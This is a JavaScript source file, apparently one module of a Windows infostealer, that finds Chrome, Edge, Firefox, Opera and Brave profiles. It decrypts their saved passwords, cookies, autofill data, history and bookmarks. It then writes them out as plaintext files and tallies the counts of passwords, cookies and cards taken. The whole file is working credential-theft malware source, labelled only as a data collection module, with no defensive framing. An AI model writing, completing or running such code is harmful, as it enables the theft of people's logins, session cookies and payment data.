/**
 * Browser Data Collection Module
 * Handles extraction of data from various web browsers
 */

const fs = require('fs');
const path = require('path');
const CoreUtils = require('../../core/utils');
const { logger } = require('../../core/logger');
const { ErrorHandler, ModuleError } = require('../../core/errors');
const { fileManager } = require('../../core/fileManager');
const { stats } = require('../../core/statistics');
const { BrowserDecryptor } = require('./decryptor');

class BrowserCollector {
    constructor() {
        this.browsers = this.getBrowserPaths();
        this.decryptor = new BrowserDecryptor();
        this.totalStats = {
            passwords: 0,
            cookies: 0,
            autofills: 0,
            cards: 0,
            history: 0,
            downloads: 0,
            bookmarks: 0
        };
    }

    /**
     * Get browser configuration paths
     * @returns {Object} Browser paths configuration
     */
    getBrowserPaths() {
        const userProfile = process.env.USERPROFILE || '';
        const localAppData = process.env.LOCALAPPDATA || '';
        const appData = process.env.APPDATA || '';

        return {
            chrome: {
                name: 'Chrome',
                paths: {
                    main: path.join(localAppData, 'Google', 'Chrome', 'User Data'),
                    profiles: path.join(localAppData, 'Google', 'Chrome', 'User Data', '%PROFILE%')
                },
                files: {
                    passwords: 'Login Data',
                    cookies: 'Network\\Cookies',
                    history: 'History',
                    bookmarks: 'Bookmarks',
                    autofill: 'Web Data',
                    downloads: 'History'
                }
            },
            edge: {
                name: 'Edge',
                paths: {
                    main: path.join(localAppData, 'Microsoft', 'Edge', 'User Data'),
                    profiles: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', '%PROFILE%')
                },
                files: {
                    passwords: 'Login Data',
                    cookies: 'Network\\Cookies',
                    history: 'History',
                    bookmarks: 'Bookmarks',
                    autofill: 'Web Data',
                    downloads: 'History'
                }
            },
            firefox: {
                name: 'Firefox',
                paths: {
                    main: path.join(appData, 'Mozilla', 'Firefox', 'Profiles'),
                    profiles: path.join(appData, 'Mozilla', 'Firefox', 'Profiles', '%PROFILE%')
                },
                files: {
                    passwords: 'logins.json',
                    cookies: 'cookies.sqlite',
                    history: 'places.sqlite',
                    bookmarks: 'places.sqlite',
                    autofill: 'formhistory.sqlite'
                }
            },
            opera: {
                name: 'Opera',
                paths: {
                    main: path.join(appData, 'Opera Software', 'Opera Stable'),
                    profiles: path.join(appData, 'Opera Software', 'Opera Stable', '%PROFILE%')
                },
                files: {
                    passwords: 'Login Data',
                    cookies: 'Network\\Cookies',
                    history: 'History',
                    bookmarks: 'Bookmarks',
                    autofill: 'Web Data'
                }
            },
            brave: {
                name: 'Brave',
                paths: {
                    main: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
                    profiles: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', '%PROFILE%')
                },
                files: {
                    passwords: 'Login Data',
                    cookies: 'Network\\Cookies',
                    history: 'History',
                    bookmarks: 'Bookmarks',
                    autofill: 'Web Data'
                }
            }
        };
    }

    /**
     * Collect data from all browsers
     * @returns {Promise<Object>} Collection results
     */
    async collect() {
        logger.info('Starting browser data collection');
        
        // Log decryption capabilities
        this.decryptor.logDecryptionCapabilities();

        try {
            const results = {};

            for (const [browserKey, browserConfig] of Object.entries(this.browsers)) {
                try {
                    const browserResult = await this.collectBrowserData(browserKey, browserConfig);
                    results[browserKey] = browserResult;
                } catch (error) {
                    ErrorHandler.handle(
                        new ModuleError(`Failed to collect data from ${browserConfig.name}`, 'browsers'),
                        null,
                        { browser: browserKey }
                    );
                    results[browserKey] = { error: error.message };
                }
            }

            // Update global statistics
            stats.addBrowser(this.totalStats);

            logger.info('Browser data collection completed', {
                totalPasswords: this.totalStats.passwords,
                totalCookies: this.totalStats.cookies,
                totalBrowsers: Object.keys(results).length
            });

            return results;
        } catch (error) {
            throw new ModuleError('Browser data collection failed', 'browsers');
        }
    }

    /**
     * Collect data from specific browser
     * @param {string} browserKey - Browser identifier
     * @param {Object} browserConfig - Browser configuration
     * @returns {Promise<Object>} Browser collection results
     */
    async collectBrowserData(browserKey, browserConfig) {
        const profiles = this.getBrowserProfiles(browserConfig);
        const browserStats = {
            passwords: 0,
            cookies: 0,
            autofills: 0,
            cards: 0,
            history: 0,
            downloads: 0,
            bookmarks: 0,
            profiles: profiles.length
        };

        if (profiles.length === 0) {
            logger.debug(`No profiles found for ${browserConfig.name}`);
            return browserStats;
        }

        for (const profile of profiles) {
            try {
                const profileStats = await this.collectProfileData(browserKey, browserConfig, profile);
                
                // Aggregate statistics
                for (const key of Object.keys(browserStats)) {
                    if (typeof browserStats[key] === 'number' && key !== 'profiles') {
                        browserStats[key] += profileStats[key] || 0;
                    }
                }
            } catch (error) {
                logger.debug(`Failed to collect profile data: ${profile.name}`, error.message);
            }
        }

        // Add to total statistics
        for (const key of Object.keys(this.totalStats)) {
            this.totalStats[key] += browserStats[key] || 0;
        }

        logger.debug(`Collected data from ${browserConfig.name}`, browserStats);
        return browserStats;
    }

    /**
     * Get browser profiles
     * @param {Object} browserConfig - Browser configuration
     * @returns {Array<Object>} Browser profiles
     */
    getBrowserProfiles(browserConfig) {
        const profiles = [];

        // Check main profile
        if (fs.existsSync(browserConfig.paths.main)) {
            profiles.push({
                name: `${browserConfig.name} - Default`,
                path: browserConfig.paths.main
            });
        }

        // Check additional profiles if using %PROFILE% pattern
        if (browserConfig.paths.profiles && browserConfig.paths.profiles.includes('%PROFILE%')) {
            const additionalProfiles = CoreUtils.getProfiles(browserConfig.paths.profiles, browserConfig.name);
            profiles.push(...additionalProfiles);
        }

        return profiles;
    }

    /**
     * Collect data from browser profile
     * @param {string} browserKey - Browser identifier
     * @param {Object} browserConfig - Browser configuration
     * @param {Object} profile - Profile information
     * @returns {Promise<Object>} Profile collection results
     */
    async collectProfileData(browserKey, browserConfig, profile) {
        const profileStats = {
            passwords: 0,
            cookies: 0,
            autofills: 0,
            cards: 0,
            history: 0,
            downloads: 0,
            bookmarks: 0
        };

        const profileFolder = `Browsers\\${browserConfig.name}\\${profile.name.replace(/[^a-zA-Z0-9]/g, '_')}`;

        // Collect different types of data
        for (const [dataType, fileName] of Object.entries(browserConfig.files)) {
            try {
                const filePath = path.join(profile.path, fileName);
                const count = await this.collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profile.path);
                
                // Map data types to stats
                switch (dataType) {
                    case 'passwords':
                        profileStats.passwords += count;
                        break;
                    case 'cookies':
                        profileStats.cookies += count;
                        break;
                    case 'autofill':
                        profileStats.autofills += count;
                        break;
                    case 'history':
                        profileStats.history += count;
                        break;
                    case 'downloads':
                        profileStats.downloads += count;
                        break;
                    case 'bookmarks':
                        profileStats.bookmarks += count;
                        break;
                }
            } catch (error) {
                logger.debug(`Failed to collect ${dataType} from ${profile.name}`, error.message);
            }
        }

        return profileStats;
    }

    /**
     * Collect and save data file
     * @param {string} filePath - Source file path
     * @param {string} profileFolder - Destination folder
     * @param {string} dataType - Type of data
     * @param {string} fileName - File name
     * @param {string} browserKey - Browser identifier
     * @param {string} profilePath - Profile path for master key lookup
     * @returns {Promise<number>} Number of records processed
     */
    async collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profilePath) {
        if (!fs.existsSync(filePath)) {
            return 0;
        }

        try {
            // Decrypt and parse the browser data
            const decryptedData = await this.decryptor.decryptAndParse(filePath, dataType, browserKey, profilePath);
            
            if (decryptedData && decryptedData.length > 0) {
                // Format as text
                const textContent = this.decryptor.formatDataAsText(decryptedData, dataType);
                
                // Determine output filename
                const outputFileName = this.getTextFileName(dataType);
                
                // Save as text file
                const saved = fileManager.saveText(textContent, profileFolder, outputFileName);
                
                if (saved) {
                    logger.debug(`Saved ${decryptedData.length} ${dataType} entries to ${outputFileName}`);
                    return decryptedData.length;
                }
            } else {
                // If no data found, save empty file to indicate we checked
                const emptyContent = `No ${dataType} found in this profile.\n`;
                const outputFileName = this.getTextFileName(dataType);
                fileManager.saveText(emptyContent, profileFolder, outputFileName);
                logger.debug(`No ${dataType} found in ${filePath}`);
            }

            // Also save the original file for backup (optional - user wants text files mainly)
            // fileManager.saveSingle(filePath, profileFolder, fileName);

            return decryptedData ? decryptedData.length : 0;
        } catch (error) {
            logger.debug(`Failed to process ${dataType} file: ${filePath}`, error.message);
            
            // Save error information
            const errorContent = `Error processing ${dataType}: ${error.message}\n`;
            const outputFileName = this.getTextFileName(dataType);
            fileManager.saveText(errorContent, profileFolder, outputFileName);
            
            return 0;
        }
    }

    /**
     * Get text filename for data type
     * @param {string} dataType - Type of data
     * @returns {string} Text filename
     */
    getTextFileName(dataType) {
        const fileMap = {
            'passwords': 'passwords.txt',
            'cookies': 'cookies.txt',
            'history': 'history.txt',
            'downloads': 'downloads.txt',
            'autofill': 'autofill.txt',
            'bookmarks': 'bookmarks.txt'
        };
        
        return fileMap[dataType] || `${dataType}.txt`;
    }

    /**
     * Get browser installation status
     * @returns {Object} Browser installation status
     */
    getBrowserStatus() {
        const status = {};

        for (const [browserKey, browserConfig] of Object.entries(this.browsers)) {
            status[browserKey] = {
                name: browserConfig.name,
                installed: fs.existsSync(browserConfig.paths.main),
                profileCount: this.getBrowserProfiles(browserConfig).length
            };
        }

        return status;
    }
}

// Export the module
module.exports = {
    BrowserCollector
};